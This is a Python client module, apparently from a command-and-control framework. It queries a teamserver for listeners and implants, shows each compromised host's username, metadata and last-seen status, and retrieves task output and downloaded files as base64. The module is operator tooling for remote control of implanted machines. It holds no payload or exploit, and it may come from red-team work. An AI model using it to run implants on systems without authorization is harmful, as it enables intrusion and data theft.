import datetime
import json
import time
from datetime import timezone, timedelta

import requests
from colorama import Fore

import Services.Diff_Secondes
import Utilities.constant as const


def get_listeners():
    url = "http://%s:%s/Listeners" % (const.TEAMSERVER_IP, const.TEAMSERVER_PORT)
    req = requests.get(url)
    content = req.text
    json_obj = json.loads(content)

    flag = 0

    while flag != len(json_obj):
        for i in json_obj:
            const.success_message("name: " + json_obj[flag]["name"])
            flag = flag + 1


def get_listener(listener_name):
    url = "http://%s:%s/Listeners/%s" % (const.TEAMSERVER_IP, const.TEAMSERVER_PORT, listener_name)
    req = requests.get(url)
    content = req.text
    json_obj = json.loads(content)
    const.success_message("name:" + json_obj["name"])

    for i in json_obj:
        print("\t" + i + ":" + Fore.LIGHTWHITE_EX, json_obj[i])


def get_implants():
    url = "http://%s:%s/Implants" % (const.TEAMSERVER_IP, const.TEAMSERVER_PORT)
    req = requests.get(url)
    content = req.text

    json_obj = json.loads(content)

    flag = 0

    while flag != len(json_obj):

        lastseen = json_obj[flag]["lastSeen"]

        delta_time = time.localtime().tm_hour - datetime.datetime.now(timezone.utc).hour
        convert_timedelta = timedelta(hours=delta_time)

        # Format and convert actual time to string
        actual_date = datetime.datetime.now() - convert_timedelta
        test = actual_date.isoformat()
        SplitTime = test.split(".")
        local_time = SplitTime[0].replace("T", " ")

        # Format date lasteen seen return by Implant (string) to match with actual time string
        lastseen_split_point = lastseen.split(".")
        lastseen_reformate = lastseen_split_point[0].replace("T", " ")
        bool_checker = Services.Diff_Secondes.secdiff(local_time, lastseen_reformate)

        if bool_checker:
            const.success_message(json_obj[flag]["metadata"]["username"])

        else:
            const.error_message(json_obj[flag]["metadata"]["username"])

        for i in json_obj[flag]["metadata"]:
            print("\t" + i + ":", json_obj[flag]["metadata"][i])

        print(Fore.LIGHTMAGENTA_EX + "\tlastSeen: " + Fore.LIGHTWHITE_EX, json_obj[flag]["lastSeen"])
        flag = flag + 1

        print("\n")


def get_implant(implant_id):
    url = "http://%s:%s/Implants/%s" % (const.TEAMSERVER_IP, const.TEAMSERVER_PORT, implant_id)
    req = requests.get(url)
    content = req.text
    json_obj = json.loads(content)

    lastseen = json_obj["lastSeen"]

    delta_time = time.localtime().tm_hour - datetime.datetime.now(timezone.utc).hour
    convert_timedelta = timedelta(hours=delta_time)

    # Format and convert actual time to string
    actual_date = datetime.datetime.now() - convert_timedelta
    test = actual_date.isoformat()
    SplitTime = test.split(".")
    local_time = SplitTime[0].replace("T", " ")

    # Format date lasteen seen return by Implant (string) to match with actual time string
    lastseen_split_point = lastseen.split(".")
    lastseen_reformate = lastseen_split_point[0].replace("T", " ")
    bool_checker = Services.Diff_Secondes.secdiff(local_time, lastseen_reformate)

    if bool_checker:
        const.success_message(json_obj["metadata"]["username"])

    else:
        const.error_message(json_obj["metadata"]["username"])

    for i in json_obj["metadata"]:
        print("\t" + Fore.LIGHTWHITE_EX, i, ":", Fore.LIGHTWHITE_EX, json_obj["metadata"][i])

    for d in json_obj:
        if "lastSeen" in d:
            print(Fore.LIGHTMAGENTA_EX, "\tlastSeen: ", Fore.LIGHTWHITE_EX, json_obj[d])


def get_all_command_output(implant_id):
    url = "http://%s:%s/Implants/%s/tasks" % (const.TEAMSERVER_IP, const.TEAMSERVER_PORT, implant_id)
    req = requests.get(url)
    content = req.text

    json_obj = json.loads(content)

    for i in json_obj:
        print(json_obj[i])


def get_last_command_output(implant_id, task_id):
    url = "http://%s:%s/Implants/%s/tasks/%s" % (const.TEAMSERVER_IP, const.TEAMSERVER_PORT, implant_id, task_id)
    req = requests.get(url)

    print(req.text)

    while req.text == "task not found":
        try:
            req = requests.get(url)
            content = req.text
            json_obj = json.loads(content)
            print(json_obj)
            print(Fore.LIGHTWHITE_EX + json_obj["result"] + "\n")

            time.sleep(1)

        except KeyboardInterrupt:
            break

        except:
            pass


def get_file_b64_byte_content(implant_id, task_id):
    print("Downloading File...", end="\r")
    time.sleep(5)
    url = "http://%s:%s/Implants/%s/tasks/%s" % (const.TEAMSERVER_IP, const.TEAMSERVER_PORT, implant_id, task_id)
    req = requests.get(url)

    content = req.text
    json_obj = json.loads(content)

    return json_obj["result"]


def get_output_google_drive_download(implant_id, task_id):
    print("Downloading File...", end="\r")
    url = "http://%s:%s/Implants/%s/tasks/%s" % (const.TEAMSERVER_IP, const.TEAMSERVER_PORT, implant_id, task_id)
    req = requests.get(url)

    while req.text == "task not found":
        try:
            req = requests.get(url)
            content = req.text
            json_obj = json.loads(content)

            time.sleep(1)

            return json_obj["result"]

        except KeyboardInterrupt:
            break

        except:
            pass
